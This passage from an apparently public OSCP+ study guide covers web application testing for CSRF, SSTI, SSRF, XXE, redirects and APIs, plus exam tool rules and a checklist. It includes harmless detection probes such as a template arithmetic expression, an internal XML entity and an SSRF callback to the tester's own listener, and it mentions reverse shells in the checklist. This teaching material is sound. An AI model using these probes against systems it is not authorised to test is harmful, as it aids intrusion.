- **Role checks:** compare a lower-privileged lab user with an approved administrator test account on a discovered privileged function.

Avoid collecting other users' private data. Save sanitized before/after requests showing the access-control boundary.

### CSRF and state-changing requests

For a **non-destructive lab action** such as changing a test profile preference, capture the request and identify its session cookies, anti-CSRF tokens, `Origin`/`Referer` handling and `SameSite` behavior. In a controlled test, check whether a missing or invalid anti-CSRF token causes rejection. A missing token **alone** does not establish CSRF; browser credential behavior and other defenses matter. Do not trigger real transactions or account takeover actions.

### Server-Side Template Injection (SSTI) — detection

Look for features that render user-supplied templates, custom messages or server-side previews. First compare a literal marker with a harmless arithmetic expression:

~~~text
OSCP_TEMPLATE_TEST
{{7*7}}
~~~

If the response contains `49` where the expression was supplied, investigate carefully: the result may come from a template engine, client-side processing, or an unrelated transformation. Template syntax differs among engines; do not assume Jinja2, Twig and other frameworks interpret expressions identically. Do not escalate to command execution until the engine and context are verified and the lab permits it.

### Server-Side Request Forgery (SSRF) — controlled callback

Look for URL importers, link previews, webhook testers, image fetchers and PDF generation from URLs. To determine whether the **server** (rather than your browser) fetches a user-supplied URL, run a simple HTTP server on your own Kali machine **from an otherwise empty directory**:

~~~bash
mkdir -p evidence/web/ssrf-callback
cd evidence/web/ssrf-callback
python3 -m http.server 8000
~~~

If the lab feature accepts a URL, submit `http://KALI_VPN_IP:8000/ssrf-test` with your real VPN IP, and watch for an incoming request. A callback is evidence of server-initiated fetching but **not proof** that the application can reach protected internal resources. Do not probe cloud metadata, private networks or third-party hosts outside your assigned scope.

### XML handling and XXE — safe parser check

For a **discovered XML endpoint** that you are permitted to test, first check whether the application accepts normal XML. A harmless *internal* entity can show whether entity expansion occurs:

~~~xml
<?xml version="1.0"?>
<!DOCTYPE note [<!ENTITY marker "OSCP_XML_MARKER">]>
<note><body>&marker;</body></note>
~~~

If the response resolves `&marker;` to `OSCP_XML_MARKER`, it suggests entity expansion. **This alone does not prove XXE** (which involves external entity resolution). Avoid requesting local files or causing large expansions as an initial test. Investigate external entities only when explicitly in scope and needed to verify impact.

### Open redirects and API request validation

- **Open redirect:** inspect discovered `next`, `return`, or `redirect` parameters. Compare a normal internal return path with a harmless external URL you control, and check the `Location` header or browser navigation. Not every redirect is a security flaw; exploitability depends on context.
- **APIs:** inspect methods, `Content-Type`, error codes, JSON field names, authorization checks and pagination on endpoints actually found in your lab. A parameter accepted by the server is not proof of mass assignment: compare what changes in your test account's resources.
- **Information disclosure:** note verbose errors, server stack traces, debug flags, source maps, backup files and unexpected response headers without disclosing sensitive values in this public repository.

### Quick decision guide

| Observation | Next manual check |
| --- | --- |
| Product/version banner | Verify versions and vendor CVEs (Section 9) |
| URL or form input changes a database result | SQLi detection, then UNION or blind checks |
| File/template parameter | Traversal/LFI and, when applicable, PHP wrapper behavior |
| Upload endpoint | Extension and MIME validation, then harmless execution test |
| Network diagnostic input | OS command-injection marker and timing tests |
| Reflected HTML/JS | Context-aware XSS checks |
| Data accessible by numeric ID | IDOR/BOLA comparison with two lab accounts |
| Template-like render input | Harmless SSTI expression |
| URL-fetching feature | SSRF callback to your own Kali listener |
| XML-consuming endpoint | XML parser behavior, then scoped XXE investigation |

## 11. Exam tool policy and evidence rules

**Exam-guide check: 2026-11-03.** Always consult the current [OSCP+ Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) before taking the exam. The allowed status depends on **what the tool or feature does**, not just its name.

| Tool or capability | OSCP+ status / condition |
| --- | --- |
| Nmap and NSE; Nikto; Burp Suite Free; DirBuster | Explicitly permitted by OffSec |
| Manual `curl`, `nc`, `base64`, `python3`; ffuf, Gobuster, WhatWeb, SearchSploit | Not individually approved in the guide; use only for allowed discovery/manual tasks, never prohibited automation |
| `msfvenom` and `exploit/multi/handler` | OffSec permits these across targets **except** that Meterpreter payload use is limited |
| Metasploit Auxiliary/Exploit/Post modules; Meterpreter payload | Restricted to **one chosen target**; no Metasploit pivoting to other machines |
| SQLmap, SQLninja and other automatic exploitation; mass vulnerability scanners; Burp Pro | Prohibited |
| AI chatbots/LLMs during the exam | Prohibited |

Do not reproduce sensitive exam content or commit discovered passwords, private keys, cookies, tokens, or proof values to a public repository. OffSec requires proof files to be read with `cat` or `type` **from their original paths in an interactive shell** and shown in properly documented screenshots; a web shell does not satisfy this requirement. See the [OffSec AI policy](https://help.offsec.com/hc/en-us/articles/35549468971156-AI-Usage-Policy-in-OffSec-Exams).

## 12. Troubleshooting

| Symptom | Likely cause / next action |
| --- | --- |
| Browser redirects to unknown hostname | Check `Location`, DNS and lab-provided hostnames |
| HTTPS certificate warning | Inspect hostname and certificate; don't assume a vulnerability |
| Gobuster reports every path | Check wildcard responses and response lengths |
| Directory scan gives many 403s | Access controls may be working; investigate only permitted paths |
| All pages look the same | Virtual host mismatch, SPA fallback or login redirect |
| Connection refused | Verify scheme, IP, port, VPN and Nmap findings |
| 429 / rate limiting | Reduce request rate; stop if required by scope |
| Download contains HTML instead of file | Check redirects, authentication and content type |

## 13. Evidence template

```text
Target IP:
Web URL / virtual host:
Open port and scheme:
Status codes / redirects:
Server / framework clues:
Discovered paths:
Login and session behavior:
API endpoints:
Potential weakness:
Evidence file / request:
Validation status: unverified | ruled out | verified
Next step:
```

## OSCP checklist

Use only checks relevant to discovered functionality; a completed checklist does not prove an application is vulnerability-free.


- [ ] Confirm correct IP, hostname, scheme and port.
- [ ] Fingerprint headers, application and technologies.
- [ ] Explore manually before automated content discovery.
- [ ] Inspect robots.txt, sitemap and linked JavaScript.
- [ ] Discover directories/files with a controlled request rate.
- [ ] Check for wildcard responses and misleading status codes.
- [ ] Investigate in-scope virtual hosts.
- [ ] Review authentication and session behavior.
- [ ] Enumerate APIs, form parameters and JavaScript-referenced routes.
- [ ] Check response security headers and relevant CORS behavior.
- [ ] Review discovered CMS/framework-specific surfaces where applicable.
- [ ] Repeat the workflow for every in-scope web port and virtual host.
- [ ] Review uploads/downloads using harmless test files.
- [ ] Check discovered web service versions against vendor advisories/CVEs; verify findings before claiming a vulnerability.
- [ ] Manually test discovered database-backed inputs for possible SQLi and compare true/false responses.
- [ ] If SQLi is confirmed, manually determine UNION column count and reflected output columns.
- [ ] If SQLi output is not reflected, compare manual boolean-based and time-based blind SQLi tests.
- [ ] Manually test identified file parameters for directory traversal/LFI and record sanitized evidence.
- [ ] If PHP LFI is present, manually check `php://filter` source disclosure and decode only sanitized lab data.
- [ ] For identified traversal inputs, manually compare standard, URL-encoded, double-encoded and nested path variants.
- [ ] Identify upload restrictions with a harmless test file; document storage and retrieval behavior.
- [ ] Test extension and multipart Content-Type validation manually using harmless upload files; verify storage and retrieval.
- [ ] After confirming PHP execution, obtain and stabilize an authorized reverse shell; record the shell context.
- [ ] Manually test relevant input parameters for OS command injection using output markers or controlled timing checks.
- [ ] Complete manual XSS, authentication, IDOR/BOLA, CSRF, SSTI, SSRF, XML and API checks where features exist.
- [ ] If command injection is confirmed, document shell access and the target account (authorized labs only).
- [ ] Save sanitized evidence and next actions.

## References

- [OffSec OSCP+ Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)
- [OWASP WSTG 4.2 — Web application security testing](https://wstg.owasp.org/stable/4-Web_Application_Security_Testing/)

- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Testing Guide — Information Gathering](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/)
- [Nmap NSE Documentation](https://nmap.org/book/man-nse.html)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

---

**Previous:** [Service-Specific Enumeration](../01-Enumeration/service-enumeration.md)
